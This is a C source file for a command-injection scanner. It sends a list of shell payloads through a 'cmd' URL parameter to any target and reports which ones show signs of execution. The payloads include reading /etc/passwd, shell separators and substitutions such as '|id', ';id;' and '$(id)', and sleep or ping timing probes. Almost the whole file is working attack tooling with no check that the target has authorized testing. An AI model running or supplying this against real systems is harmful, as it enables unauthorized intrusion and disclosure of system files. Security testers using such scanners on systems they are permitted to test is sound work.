#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <json-c/json.h>
#include <pthread.h>
#include <unistd.h>

#define MAX_PAYLOAD_SIZE 2048
#define MAX_RESPONSE_SIZE 8192

struct Response {
    char *data;
    size_t size;
};

struct RCEResult {
    char payload[MAX_PAYLOAD_SIZE];
    int vulnerable;
    char evidence[MAX_RESPONSE_SIZE];
    char command_output[MAX_RESPONSE_SIZE];
};

size_t write_callback(void *ptr, size_t size, size_t nmemb, struct Response *response) {
    size_t new_size = response->size + size * nmemb;
    response->data = realloc(response->data, new_size + 1);
    memcpy(response->data + response->size, ptr, size * nmemb);
    response->size = new_size;
    response->data[new_size] = '\0';
    return size * nmemb;
}

char *encode_payload(const char *payload) {
    CURL *curl = curl_easy_init();
    char *encoded = curl_easy_escape(curl, payload, 0);
    curl_easy_cleanup(curl);
    return encoded;
}

struct RCEResult test_rce(const char *url, const char *payload) {
    CURL *curl;
    CURLcode res;
    struct Response response = {0};
    struct RCEResult result = {0};
    char *encoded_payload;
    char full_url[MAX_PAYLOAD_SIZE];
    
    strncpy(result.payload, payload, sizeof(result.payload) - 1);
    
    curl = curl_easy_init();
    if(curl) {
        encoded_payload = encode_payload(payload);
        snprintf(full_url, sizeof(full_url), "%s?cmd=%s", url, encoded_payload);
        
        curl_easy_setopt(curl, CURLOPT_URL, full_url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        
        res = curl_easy_perform(curl);
        
        if(res == CURLE_OK) {
            // Check for command execution evidence
            if(strstr(response.data, "uid=") || 
               strstr(response.data, "root:") ||
               strstr(response.data, "WIN-") ||
               strstr(response.data, "WINDOWS") ||
               strstr(response.data, "/bin/")) {
                result.vulnerable = 1;
                strncpy(result.evidence, response.data, sizeof(result.evidence) - 1);
            }
        }
        
        curl_free(encoded_payload);
        free(response.data);
        curl_easy_cleanup(curl);
    }
    
    return result;
}

int main(int argc, char *argv[]) {
    if(argc != 2) {
        printf("Usage: %s <url>\n", argv[0]);
        return 1;
    }
    
    const char *payloads[] = {
        "id",
        "whoami",
        "cat /etc/passwd",
        "dir",
        "ls -la",
        "type C:\\Windows\\win.ini",
        "|id",
        ";id;",
        "&&id",
        "||id",
        "`id`",
        "$(id)",
        "& ping -c 1 127.0.0.1 &",
        "\n/usr/bin/id\n",
        "echo 'TEST'$(id)",
        "echo 'TEST'`id`",
        "|timeout /T 5",
        "`sleep 5`",
        "ping -n 5 127.0.0.1",
    };
    
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);
    struct json_object *root = json_object_new_object();
    struct json_object *results = json_object_new_array();
    
    for(int i = 0; i < num_payloads; i++) {
        struct RCEResult result = test_rce(argv[1], payloads[i]);
        if(result.vulnerable) {
            struct json_object *vuln = json_object_new_object();
            json_object_object_add(vuln, "payload", json_object_new_string(result.payload));
            json_object_object_add(vuln, "evidence", json_object_new_string(result.evidence));
            json_object_array_add(results, vuln);
        }
    }
    
    json_object_object_add(root, "rce_vulnerabilities", results);
    printf("%s\n", json_object_to_json_string_ext(root, JSON_C_TO_STRING_PRETTY));
    
    json_object_put(root);
    return 0;
} 